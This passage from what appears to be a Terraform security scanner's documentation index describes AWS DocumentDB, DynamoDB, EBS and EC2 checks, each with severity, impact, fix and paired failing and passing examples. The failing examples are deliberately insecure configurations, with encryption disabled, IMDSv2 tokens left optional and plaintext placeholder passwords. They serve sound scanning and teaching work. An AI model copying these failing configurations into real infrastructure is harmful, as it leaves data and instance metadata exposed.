5\n   preferred_backup_window = \"07:00-09:00\"\n   skip_final_snapshot     = true\n   enabled_cloudwatch_logs_exports = \"audit\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/documentdb/enable-log-export/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/docdb_cluster#enabled_cloudwatch_logs_exports</p> </li> <li> <p>https://docs.aws.amazon.com/documentdb/latest/developerguide/event-auditing.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/documentdb/enable-storage-encryption/","text":"","title":"DocumentDB storage must be encrypted"},{"location":"checks/aws/documentdb/enable-storage-encryption/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/documentdb/enable-storage-encryption/#explanation","text":"<p>Encryption of the underlying storage used by DocumentDB ensures that if their is compromise of the disks, the data is still protected.</p>","title":"Explanation"},{"location":"checks/aws/documentdb/enable-storage-encryption/#possible-impact","text":"<p>Unencrypted sensitive data is vulnerable to compromise.</p>","title":"Possible Impact"},{"location":"checks/aws/documentdb/enable-storage-encryption/#suggested-resolution","text":"<p>Enable storage encryption</p>","title":"Suggested Resolution"},{"location":"checks/aws/documentdb/enable-storage-encryption/#insecure-example","text":"<p>The following example will fail the aws-documentdb-enable-storage-encryption check. <pre><code> resource \"aws_docdb_cluster\" \"bad_example\" {\n   cluster_identifier      = \"my-docdb-cluster\"\n   engine                  = \"docdb\"\n   master_username         = \"foo\"\n   master_password         = \"mustbeeightchars\"\n   backup_retention_period = 5\n   preferred_backup_window = \"07:00-09:00\"\n   skip_final_snapshot     = true\n   storage_encrypted = false\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/documentdb/enable-storage-encryption/#secure-example","text":"<p>The following example will pass the aws-documentdb-enable-storage-encryption check. <pre><code> resource \"aws_docdb_cluster\" \"good_example\" {\n   cluster_identifier      = \"my-docdb-cluster\"\n   engine                  = \"docdb\"\n   master_username         = \"foo\"\n   master_password         = \"mustbeeightchars\"\n   backup_retention_period = 5\n   preferred_backup_window = \"07:00-09:00\"\n   skip_final_snapshot     = true\n   storage_encrypted = true\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/documentdb/enable-storage-encryption/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/docdb_cluster#storage_encrypted</p> </li> <li> <p>https://docs.aws.amazon.com/documentdb/latest/developerguide/encryption-at-rest.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/documentdb/encryption-customer-key/","text":"","title":"DocumentDB encryption should use Customer Managed Keys"},{"location":"checks/aws/documentdb/encryption-customer-key/#default-severity-low","text":"","title":"Default Severity: low"},{"location":"checks/aws/documentdb/encryption-customer-key/#explanation","text":"<p>Encryption using AWS keys provides protection for your DocumentDB underlying storage. To increase control of the encryption and manage factors like rotation use customer managed keys.</p>","title":"Explanation"},{"location":"checks/aws/documentdb/encryption-customer-key/#possible-impact","text":"<p>Using AWS managed keys does not allow for fine grained control</p>","title":"Possible Impact"},{"location":"checks/aws/documentdb/encryption-customer-key/#suggested-resolution","text":"<p>Enable encryption using customer managed keys</p>","title":"Suggested Resolution"},{"location":"checks/aws/documentdb/encryption-customer-key/#insecure-example","text":"<p>The following example will fail the aws-documentdb-encryption-customer-key check. <pre><code> resource \"aws_docdb_cluster\" \"docdb\" {\n   cluster_identifier      = \"my-docdb-cluster\"\n   engine                  = \"docdb\"\n   master_username         = \"foo\"\n   master_password         = \"mustbeeightchars\"\n   backup_retention_period = 5\n   preferred_backup_window = \"07:00-09:00\"\n   skip_final_snapshot     = true\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/documentdb/encryption-customer-key/#secure-example","text":"<p>The following example will pass the aws-documentdb-encryption-customer-key check. <pre><code> resource \"aws_kms_key\" \"docdb_encryption\" {\n    enable_key_rotation = true\n }\n\n resource \"aws_docdb_cluster\" \"docdb\" {\n   cluster_identifier      = \"my-docdb-cluster\"\n   engine                  = \"docdb\"\n   master_username         = \"foo\"\n   master_password         = \"mustbeeightchars\"\n   backup_retention_period = 5\n   preferred_backup_window = \"07:00-09:00\"\n   skip_final_snapshot     = true\n   kms_key_id             = aws_kms_key.docdb_encryption.arn\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/documentdb/encryption-customer-key/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/docdb_cluster#kms_key_id</p> </li> <li> <p>https://docs.aws.amazon.com/documentdb/latest/developerguide/security.encryption.ssl.public-key.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/dynamodb/","text":"","title":"dynamodb"},{"location":"checks/aws/dynamodb/#checks","text":"<ul> <li> <p>enable-at-rest-encryption DAX Cluster and tables should always encrypt data at rest</p> </li> <li> <p>enable-recovery Point in time recovery should be enabled to protect DynamoDB table</p> </li> <li> <p>table-customer-key DynamoDB tables should use at rest encryption with a Customer Managed Key</p> </li> </ul>","title":"Checks"},{"location":"checks/aws/dynamodb/enable-at-rest-encryption/","text":"","title":"DAX Cluster and tables should always encrypt data at rest"},{"location":"checks/aws/dynamodb/enable-at-rest-encryption/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/dynamodb/enable-at-rest-encryption/#explanation","text":"<p>Amazon DynamoDB Accelerator (DAX) and table encryption at rest provides an additional layer of data protection by helping secure your data from unauthorized access to the underlying storage.</p>","title":"Explanation"},{"location":"checks/aws/dynamodb/enable-at-rest-encryption/#possible-impact","text":"<p>Data can be freely read if compromised</p>","title":"Possible Impact"},{"location":"checks/aws/dynamodb/enable-at-rest-encryption/#suggested-resolution","text":"<p>Enable encryption at rest for DAX Cluster</p>","title":"Suggested Resolution"},{"location":"checks/aws/dynamodb/enable-at-rest-encryption/#insecure-example","text":"<p>The following example will fail the aws-dynamodb-enable-at-rest-encryption check. <pre><code> resource \"aws_dax_cluster\" \"bad_example\" {\n    // no server side encryption at all\n }\n\n resource \"aws_dax_cluster\" \"bad_example\" {\n    // other DAX config\n\n    server_side_encryption {\n        // empty server side encryption config\n    }\n }\n\n resource \"aws_dax_cluster\" \"bad_example\" {\n    // other DAX config\n\n    server_side_encryption {\n        enabled = false // disabled server side encryption\n    }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/dynamodb/enable-at-rest-encryption/#secure-example","text":"<p>The following example will pass the aws-dynamodb-enable-at-rest-encryption check. <pre><code> resource \"aws_dax_cluster\" \"good_example\" {\n    // other DAX config\n\n    server_side_encryption {\n        enabled = true // enabled server side encryption\n    }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/dynamodb/enable-at-rest-encryption/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/dax_cluster#server_side_encryption</p> </li> <li> <p>https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/DAXEncryptionAtRest.html</p> </li> <li> <p>https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-dax-cluster.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/dynamodb/enable-recovery/","text":"","title":"Point in time recovery should be enabled to protect DynamoDB table"},{"location":"checks/aws/dynamodb/enable-recovery/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/aws/dynamodb/enable-recovery/#explanation","text":"<p>DynamoDB tables should be protected against accidentally or malicious write/delete actions by ensuring that there is adequate protection.</p> <p>By enabling point-in-time-recovery you can restore to a known point in the event of loss of data.</p>","title":"Explanation"},{"location":"checks/aws/dynamodb/enable-recovery/#possible-impact","text":"<p>Accidental or malicious writes and deletes can't be rolled back</p>","title":"Possible Impact"},{"location":"checks/aws/dynamodb/enable-recovery/#suggested-resolution","text":"<p>Enable point in time recovery</p>","title":"Suggested Resolution"},{"location":"checks/aws/dynamodb/enable-recovery/#insecure-example","text":"<p>The following example will fail the aws-dynamodb-enable-recovery check. <pre><code> resource \"aws_dynamodb_table\" \"bad_example\" {\n    name             = \"example\"\n    hash_key         = \"TestTableHashKey\"\n    billing_mode     = \"PAY_PER_REQUEST\"\n    stream_enabled   = true\n    stream_view_type = \"NEW_AND_OLD_IMAGES\"\n\n    attribute {\n      name = \"TestTableHashKey\"\n      type = \"S\"\n    }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/dynamodb/enable-recovery/#secure-example","text":"<p>The following example will pass the aws-dynamodb-enable-recovery check. <pre><code> resource \"aws_dynamodb_table\" \"good_example\" {\n    name             = \"example\"\n    hash_key         = \"TestTableHashKey\"\n    billing_mode     = \"PAY_PER_REQUEST\"\n    stream_enabled   = true\n    stream_view_type = \"NEW_AND_OLD_IMAGES\"\n\n    attribute {\n      name = \"TestTableHashKey\"\n      type = \"S\"\n    }\n\n    point_in_time_recovery {\n        enabled = true\n    }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/dynamodb/enable-recovery/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/dynamodb_table#point_in_time_recovery</p> </li> <li> <p>https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/PointInTimeRecovery.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/dynamodb/table-customer-key/","text":"","title":"DynamoDB tables should use at rest encryption with a Customer Managed Key"},{"location":"checks/aws/dynamodb/table-customer-key/#default-severity-low","text":"","title":"Default Severity: low"},{"location":"checks/aws/dynamodb/table-customer-key/#explanation","text":"<p>DynamoDB tables are encrypted by default using AWS managed encryption keys. To increase control of the encryption and control the management of factors like key rotation, use a Customer Managed Key.</p>","title":"Explanation"},{"location":"checks/aws/dynamodb/table-customer-key/#possible-impact","text":"<p>Using AWS managed keys does not allow for fine grained control</p>","title":"Possible Impact"},{"location":"checks/aws/dynamodb/table-customer-key/#suggested-resolution","text":"<p>Enable server side encryption with a customer managed key</p>","title":"Suggested Resolution"},{"location":"checks/aws/dynamodb/table-customer-key/#insecure-example","text":"<p>The following example will fail the aws-dynamodb-table-customer-key check. <pre><code> resource \"aws_dynamodb_table\" \"bad_example\" {\n    name             = \"example\"\n    hash_key         = \"TestTableHashKey\"\n    billing_mode     = \"PAY_PER_REQUEST\"\n    stream_enabled   = true\n    stream_view_type = \"NEW_AND_OLD_IMAGES\"\n\n    attribute {\n      name = \"TestTableHashKey\"\n      type = \"S\"\n    }\n\n    replica {\n      region_name = \"us-east-2\"\n    }\n\n    replica {\n      region_name = \"us-west-2\"\n    }\n   }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/dynamodb/table-customer-key/#secure-example","text":"<p>The following example will pass the aws-dynamodb-table-customer-key check. <pre><code> resource \"aws_kms_key\" \"dynamo_db_kms\" {\n    enable_key_rotation = true\n }\n\n resource \"aws_dynamodb_table\" \"good_example\" {\n    name             = \"example\"\n    hash_key         = \"TestTableHashKey\"\n    billing_mode     = \"PAY_PER_REQUEST\"\n    stream_enabled   = true\n    stream_view_type = \"NEW_AND_OLD_IMAGES\"\n\n    attribute {\n      name = \"TestTableHashKey\"\n      type = \"S\"\n    }\n\n    replica {\n      region_name = \"us-east-2\"\n    }\n\n    replica {\n      region_name = \"us-west-2\"\n    }\n\n    server_side_encryption {\n        enabled     = true\n        kms_key_arn = aws_kms_key.dynamo_db_kms.key_id\n    }\n   }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/dynamodb/table-customer-key/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/dynamodb_table#server_side_encryption</p> </li> <li> <p>https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/EncryptionAtRest.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/ebs/","text":"","title":"ebs"},{"location":"checks/aws/ebs/#checks","text":"<ul> <li> <p>enable-volume-encryption EBS volumes must be encrypted</p> </li> <li> <p>encryption-customer-key EBS volume encryption should use Customer Managed Keys</p> </li> </ul>","title":"Checks"},{"location":"checks/aws/ebs/enable-volume-encryption/","text":"","title":"EBS volumes must be encrypted"},{"location":"checks/aws/ebs/enable-volume-encryption/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/ebs/enable-volume-encryption/#explanation","text":"<p>By enabling encryption on EBS volumes you protect the volume, the disk I/O and any derived snapshots from compromise if intercepted.</p>","title":"Explanation"},{"location":"checks/aws/ebs/enable-volume-encryption/#possible-impact","text":"<p>Unencrypted sensitive data is vulnerable to compromise.</p>","title":"Possible Impact"},{"location":"checks/aws/ebs/enable-volume-encryption/#suggested-resolution","text":"<p>Enable encryption of EBS volumes</p>","title":"Suggested Resolution"},{"location":"checks/aws/ebs/enable-volume-encryption/#insecure-example","text":"<p>The following example will fail the aws-ebs-enable-volume-encryption check. <pre><code> resource \"aws_ebs_volume\" \"bad_example\" {\n   availability_zone = \"us-west-2a\"\n   size              = 40\n\n   tags = {\n     Name = \"HelloWorld\"\n   }\n   encrypted = false\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/ebs/enable-volume-encryption/#secure-example","text":"<p>The following example will pass the aws-ebs-enable-volume-encryption check. <pre><code> resource \"aws_ebs_volume\" \"good_example\" {\n   availability_zone = \"us-west-2a\"\n   size              = 40\n\n   tags = {\n     Name = \"HelloWorld\"\n   }\n   encrypted = true\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/ebs/enable-volume-encryption/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ebs_volume#encrypted</p> </li> <li> <p>https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/ebs/encryption-customer-key/","text":"","title":"EBS volume encryption should use Customer Managed Keys"},{"location":"checks/aws/ebs/encryption-customer-key/#default-severity-low","text":"","title":"Default Severity: low"},{"location":"checks/aws/ebs/encryption-customer-key/#explanation","text":"<p>Encryption using AWS keys provides protection for your EBS volume. To increase control of the encryption and manage factors like rotation use customer managed keys.</p>","title":"Explanation"},{"location":"checks/aws/ebs/encryption-customer-key/#possible-impact","text":"<p>Using AWS managed keys does not allow for fine grained control</p>","title":"Possible Impact"},{"location":"checks/aws/ebs/encryption-customer-key/#suggested-resolution","text":"<p>Enable encryption using customer managed keys</p>","title":"Suggested Resolution"},{"location":"checks/aws/ebs/encryption-customer-key/#insecure-example","text":"<p>The following example will fail the aws-ebs-encryption-customer-key check. <pre><code> resource \"aws_ebs_volume\" \"example\" {\n   availability_zone = \"us-west-2a\"\n   size              = 40\n\n   tags = {\n     Name = \"HelloWorld\"\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/ebs/encryption-customer-key/#secure-example","text":"<p>The following example will pass the aws-ebs-encryption-customer-key check. <pre><code> resource \"aws_kms_key\" \"ebs_encryption\" {\n    enable_key_rotation = true\n }\n\n resource \"aws_ebs_volume\" \"example\" {\n   availability_zone = \"us-west-2a\"\n   size              = 40\n\n   kms_key_id = aws_kms_key.ebs_encryption.arn\n\n   tags = {\n     Name = \"HelloWorld\"\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/ebs/encryption-customer-key/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ebs_volume#kms_key_id</p> </li> <li> <p>https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/ec2/","text":"","title":"ec2"},{"location":"checks/aws/ec2/#checks","text":"<ul> <li> <p>add-description-to-security-group Missing description for security group.</p> </li> <li> <p>add-description-to-security-group-rule Missing description for security group rule.</p> </li> <li> <p>enable-at-rest-encryption Instance with unencrypted block device.</p> </li> <li> <p>enable-launch-config-at-rest-encryption Launch configuration with unencrypted block device.</p> </li> <li> <p>enable-volume-encryption EBS volumes must be encrypted</p> </li> <li> <p>enforce-http-token-imds aws_instance should activate session tokens for Instance Metadata Service.</p> </li> <li> <p>enforce-launch-config-http-token-imds aws_instance should activate session tokens for Instance Metadata Service.</p> </li> <li> <p>no-default-vpc AWS best practice to not use the default VPC for workflows</p> </li> <li> <p>no-excessive-port-access An ingress Network ACL rule allows ALL ports.</p> </li> <li> <p>no-public-egress-sgr An egress security group rule allows traffic to /0.</p> </li> <li> <p>no-public-ingress-acl An ingress Network ACL rule allows specific ports from /0.</p> </li> <li> <p>no-public-ingress-sgr An ingress security group rule allows traffic from /0.</p> </li> <li> <p>no-public-ip Launch configuration should not have a public IP address.</p> </li> <li> <p>no-public-ip-subnet Instances in a subnet should not receive a public IP address by default.</p> </li> <li> <p>no-secrets-in-launch-template-user-data User data for EC2 instances must not contain sensitive AWS keys</p> </li> <li> <p>no-secrets-in-user-data User data for EC2 instances must not contain sensitive AWS keys</p> </li> <li> <p>no-sensitive-info Ensure all data stored in the launch configuration EBS is securely encrypted</p> </li> <li> <p>volume-encryption-customer-key EBS volume encryption should use Customer Managed Keys</p> </li> </ul>","title":"Checks"},{"location":"checks/aws/ec2/add-description-to-security-group/","text":"","title":"Missing description for security group."},{"location":"checks/aws/ec2/add-description-to-security-group/#default-severity-low","text":"","title":"Default Severity: low"},{"location":"checks/aws/ec2/add-description-to-security-group/#explanation","text":"<p>Security groups should include a description for auditing purposes.</p> <p>Simplifies auditing, debugging, and managing security groups.</p>","title":"Explanation"},{"location":"checks/aws/ec2/add-description-to-security-group/#possible-impact","text":"<p>Descriptions provide context for the firewall rule reasons</p>","title":"Possible Impact"},{"location":"checks/aws/ec2/add-description-to-security-group/#suggested-resolution","text":"<p>Add descriptions for all security groups</p>","title":"Suggested Resolution"},{"location":"checks/aws/ec2/add-description-to-security-group/#insecure-example","text":"<p>The following example will fail the aws-ec2-add-description-to-security-group check. <pre><code> resource \"aws_security_group\" \"bad_example\" {\n   name        = \"http\"\n   description = \"\"\n\n   ingress {\n     description = \"HTTP from VPC\"\n     from_port   = 80\n     to_port     = 80\n     protocol    = \"tcp\"\n     cidr_blocks = [aws_vpc.main.cidr_block]\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/ec2/add-description-to-security-group/#secure-example","text":"<p>The following example will pass the aws-ec2-add-description-to-security-group check. <pre><code> resource \"aws_security_group\" \"good_example\" {\n   name        = \"http\"\n   description = \"Allow inbound HTTP traffic\"\n\n   ingress {\n     description = \"HTTP from VPC\"\n     from_port   = 80\n     to_port     = 80\n     protocol    = \"tcp\"\n     cidr_blocks = [aws_vpc.main.cidr_block]\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/ec2/add-description-to-security-group/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group</p> </li> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group_rule</p> </li> <li> <p>https://www.cloudconformity.com/knowledge-base/aws/EC2/security-group-rules-description.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/ec2/add-description-to-security-group-rule/","text":"","title":"Missing description for security group rule."},{"location":"checks/aws/ec2/add-description-to-security-group-rule/#default-severity-low","text":"","title":"Default Severity: low"},{"location":"checks/aws/ec2/add-description-to-security-group-rule/#explanation","text":"<p>Security group rules should include a description for auditing purposes.</p> <p>Simplifies auditing, debugging, and managing security groups.</p>","title":"Explanation"},{"location":"checks/aws/ec2/add-description-to-security-group-rule/#possible-impact","text":"<p>Descriptions provide context for the firewall rule reasons</p>","title":"Possible Impact"},{"location":"checks/aws/ec2/add-description-to-security-group-rule/#suggested-resolution","text":"<p>Add descriptions for all security groups rules</p>","title":"Suggested Resolution"},{"location":"checks/aws/ec2/add-description-to-security-group-rule/#insecure-example","text":"<p>The following example will fail the aws-ec2-add-description-to-security-group-rule check. <pre><code> resource \"aws_security_group\" \"bad_example\" {\n   name        = \"http\"\n\n   ingress {\n     from_port   = 80\n     to_port     = 80\n     protocol    = \"tcp\"\n     cidr_blocks = [aws_vpc.main.cidr_block]\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/ec2/add-description-to-security-group-rule/#secure-example","text":"<p>The following example will pass the aws-ec2-add-description-to-security-group-rule check. <pre><code> resource \"aws_security_group\" \"good_example\" {\n   name        = \"http\"\n   description = \"Allow inbound HTTP traffic\"\n\n   ingress {\n     description = \"HTTP from VPC\"\n     from_port   = 80\n     to_port     = 80\n     protocol    = \"tcp\"\n     cidr_blocks = [aws_vpc.main.cidr_block]\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/ec2/add-description-to-security-group-rule/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group</p> </li> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group_rule</p> </li> <li> <p>https://www.cloudconformity.com/knowledge-base/aws/EC2/security-group-rules-description.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/ec2/enable-at-rest-encryption/","text":"","title":"Instance with unencrypted block device."},{"location":"checks/aws/ec2/enable-at-rest-encryption/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/ec2/enable-at-rest-encryption/#explanation","text":"<p>Block devices should be encrypted to ensure sensitive data is held securely at rest.</p>","title":"Explanation"},{"location":"checks/aws/ec2/enable-at-rest-encryption/#possible-impact","text":"<p>The block device could be compromised and read from</p>","title":"Possible Impact"},{"location":"checks/aws/ec2/enable-at-rest-encryption/#suggested-resolution","text":"<p>Turn on encryption for all block devices</p>","title":"Suggested Resolution"},{"location":"checks/aws/ec2/enable-at-rest-encryption/#insecure-example","text":"<p>The following example will fail the aws-ec2-enable-at-rest-encryption check. <pre><code>resource \"aws_instance\" \"bad_example\" {\n  ami = \"ami-7f89a64f\"\n  instance_type = \"t1.micro\"\n\n  root_block_device {\n      encrypted = false\n  }\n\n  ebs_block_device {\n    device_name = \"/dev/sdg\"\n    volume_size = 5\n    volume_type = \"gp2\"\n    delete_on_termination = false\n    encrypted = false\n  }\n}\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/ec2/enable-at-rest-encryption/#secure-example","text":"<p>The following example will pass the aws-ec2-enable-at-rest-encryption check. <pre><code>resource \"aws_instance\" \"good_example\" {\n  ami = \"ami-7f89a64f\"\n  instance_type = \"t1.micro\"\n\n  root_block_device {\n      encrypted = true\n  }\n\n  ebs_block_device {\n    device_name = \"/dev/sdg\"\n    volume_size = 5\n    volume_type = \"gp2\"\n    delete_on_termination = false\n    encrypted = true\n  }\n}\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/ec2/enable-at-rest-encryption/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#ebs-ephemeral-and-root-block-devices</p> </li> <li> <p>https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/RootDeviceStorage.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/ec2/enable-launch-config-at-rest-encryption/","text":"","title":"Launch configuration with unencrypted block device."},{"location":"checks/aws/ec2/enable-launch-config-at-rest-encryption/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/ec2/enable-launch-config-at-rest-encryption/#explanation","text":"<p>Block devices should be encrypted to ensure sensitive data is held securely at rest.</p>","title":"Explanation"},{"location":"checks/aws/ec2/enable-launch-config-at-rest-encryption/#possible-impact","text":"<p>The block device could be compromised and read from</p>","title":"Possible Impact"},{"location":"checks/aws/ec2/enable-launch-config-at-rest-encryption/#suggested-resolution","text":"<p>Turn on encryption for all block devices</p>","title":"Suggested Resolution"},{"location":"checks/aws/ec2/enable-launch-config-at-rest-encryption/#insecure-example","text":"<p>The following example will fail the aws-ec2-enable-launch-config-at-rest-encryption check. <pre><code> resource \"aws_launch_configuration\" \"bad_example\" {\n    root_block_device {\n        encrypted = false\n    }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/ec2/enable-launch-config-at-rest-encryption/#secure-example","text":"<p>The following example will pass the aws-ec2-enable-launch-config-at-rest-encryption check. <pre><code> resource \"aws_launch_configuration\" \"good_example\" {\n    root_block_device {\n        encrypted = true\n    }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/ec2/enable-launch-config-at-rest-encryption/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#ebs-ephemeral-and-root-block-devices</p> </li> <li> <p>https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/RootDeviceStorage.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/ec2/enable-volume-encryption/","text":"","title":"EBS volumes must be encrypted"},{"location":"checks/aws/ec2/enable-volume-encryption/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/ec2/enable-volume-encryption/#explanation","text":"<p>By enabling encryption on EBS volumes you protect the volume, the disk I/O and any derived snapshots from compromise if intercepted.</p>","title":"Explanation"},{"location":"checks/aws/ec2/enable-volume-encryption/#possible-impact","text":"<p>Unencrypted sensitive data is vulnerable to compromise.</p>","title":"Possible Impact"},{"location":"checks/aws/ec2/enable-volume-encryption/#suggested-resolution","text":"<p>Enable encryption of EBS volumes</p>","title":"Suggested Resolution"},{"location":"checks/aws/ec2/enable-volume-encryption/#insecure-example","text":"<p>The following example will fail the aws-ec2-enable-volume-encryption check. <pre><code> resource \"aws_ebs_volume\" \"bad_example\" {\n   availability_zone = \"us-west-2a\"\n   size              = 40\n\n   tags = {\n     Name = \"HelloWorld\"\n   }\n   encrypted = false\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/ec2/enable-volume-encryption/#secure-example","text":"<p>The following example will pass the aws-ec2-enable-volume-encryption check. <pre><code> resource \"aws_ebs_volume\" \"good_example\" {\n   availability_zone = \"us-west-2a\"\n   size              = 40\n\n   tags = {\n     Name = \"HelloWorld\"\n   }\n   encrypted = true\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/ec2/enable-volume-encryption/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ebs_volume#encrypted</p> </li> <li> <p>https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/ec2/enforce-http-token-imds/","text":"","title":"aws_instance should activate session tokens for Instance Metadata Service."},{"location":"checks/aws/ec2/enforce-http-token-imds/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/ec2/enforce-http-token-imds/#explanation","text":"<p>IMDS v2 (Instance Metadata Service) introduced session authentication tokens which improve security when talking to IMDS. By default <code>aws_instance</code> resource sets IMDS session auth tokens to be optional.  To fully protect IMDS you need to enable session tokens by using <code>metadata_options</code> block and its <code>http_tokens</code> variable set to <code>required</code>.</p>","title":"Explanation"},{"location":"checks/aws/ec2/enforce-http-token-imds/#possible-impact","text":"<p>Instance metadata service can be interacted with freely</p>","title":"Possible Impact"},{"location":"checks/aws/ec2/enforce-http-token-imds/#suggested-resolution","text":"<p>Enable HTTP token requirement for IMDS</p>","title":"Suggested Resolution"},{"location":"checks/aws/ec2/enforce-http-token-imds/#insecure-example","text":"<p>The following example will fail the aws-ec2-enforce-http-token-imds check. <pre><code> resource \"aws_instance\" \"bad_example\" {\n     ami           = \"ami-005e54dee72cc1d00\"\n     instance_type = \"t2.micro\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/ec2/enforce-http-token-imds/#secure-example","text":"<p>The following example will pass the aws-ec2-enforce-http-token-imds check. <pre><code> resource \"aws_instance\" \"good_example\" {\n     ami           = \"ami-005e54dee72cc1d00\"\n     instance_type = \"t2.micro\"\n     metadata_options {\n     http_tokens = \"required\"\n     }  \n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/ec2/enforce-http-token-imds/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#metadata-options</p> </li> <li> <p>https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service</p> </li> </ul>","title":"Links"},{"location":"checks/aws/ec2/enforce-launch-config-http-token-imds/","text":"","title":"aws_instance should activate session tokens for Instance Metadata Service."},{"location":"checks/aws/ec2/enforce-launch-config-http-token-imds/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/ec2/enforce-launch-config-http-token-imds/#explanation","text":"<p>IMDS v2 (Instance Metadata Service) introduced session authentication tokens which improve security when talking to IMDS. By default <code>aws_instance</code> resource sets IMDS session auth tokens to be optional.  To fully protect IMDS you need to enable session tokens by using <code>metadata_options</code> block and its <code>http_tokens</code> variable set to <code>required</code>.</p>","title":"Explanation"},{"location":"checks/aws/ec2/enforce-launch-config-http-token-imds/#possible-impact","text":"<p>Instance metadata service can be interacted with freely</p>","title":"Possible Impact"},{"location":"checks/aws/ec2/enforce-launch-config-http-token-imds/#suggested-resolution","text":"<p>Enable HTTP token requirement for IMDS</p>","title":"Suggested Resolution"},{"location":"checks/aws/ec2/enforce-launch-config-http-token-imds/#insecure-example","text":"<p>The following example will fail the aws-ec2-enforce-launch-config-http-token-imds check. <pre><code> resource \"aws_launch_template\" \"bad_example\" {\n     image_id      = \"ami-005e54dee72cc1d00\"\n     instance_type = \"t2.micro\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/ec2/enforce-launch-config-http-token-imds/#secure-example","text":"<p>The following example will pass the aws-ec2-enforce-launch-config-http-token-imds check. <pre><code> resource \"aws_launch_template\" \"good_example\" {\n     image_id      = \"ami-005e54dee72cc1d00\"\n     instance_type = \"t2.micro\"\n     metadata_options {\n       http_tokens = \"required\"\n     }  \n }\n</code></pre></p>","title":"Secure 